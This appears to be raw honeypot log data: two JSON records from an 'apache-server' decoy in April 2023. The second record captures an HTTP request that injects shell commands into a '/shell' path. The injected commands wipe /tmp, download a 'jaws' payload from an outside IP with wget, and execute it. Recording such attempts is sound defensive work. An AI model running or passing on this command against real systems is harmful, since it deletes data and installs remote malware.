{"customerid":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413","honeyserverid":"87422976-5cd1-469f-9125-4b1f29054ed5","logkind":"connection","honeypotid":"8BE585FB-2F2F-4BC6-8848-4165C1C4AA46","honeypotname":"apache-server","time":"2023-04-03T05:59:53.122022","parsedMessage":{"timestamp":"2023-04-03 05:59:53.122022","message_type":null,"correlation_id":null,"level":"INFO","message":"connection-log connection from 218.28.124.102:51352 to port 80","ip":"218.28.124.102"},"id":"25353868-464f-42a9-93fd-3a34a20303e4","EventProcessedUtcTime":"2023-04-03T05:59:53.5477620Z","PartitionId":0,"EventEnqueuedUtcTime":"2023-04-03T05:59:53.3290000Z","path":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413/87422976-5cd1-469f-9125-4b1f29054ed5/apache-server/218.28.124.102"}
{"customerid":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413","honeyserverid":"87422976-5cd1-469f-9125-4b1f29054ed5","logkind":"honeypot","honeypotid":"8BE585FB-2F2F-4BC6-8848-4165C1C4AA46","honeypotname":"apache-server","time":"Mon Apr  3 06:00:01 UTC 2023","parsedMessage":{"timestamp":"2023-04-03 05:59:52+00:00","message_type":"http-access","correlation_id":null,"level":"WARNING","message":"218.28.124.102 - - \"GET /shell?cd+/tmp;rm+-rf+*;wget+94.158.247.123/jaws;sh+/tmp/jaws HTTP/1.1\" 404 488 \"-\" \"Hello, world\"","ip":"218.28.124.102"},"id":"d593cf5d-9534-4730-9dd0-71f1e17ac364","EventProcessedUtcTime":"2023-04-03T06:00:07.4440672Z","PartitionId":0,"EventEnqueuedUtcTime":"2023-04-03T06:00:07.4070000Z","path":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413/87422976-5cd1-469f-9125-4b1f29054ed5/apache-server/218.28.124.102"}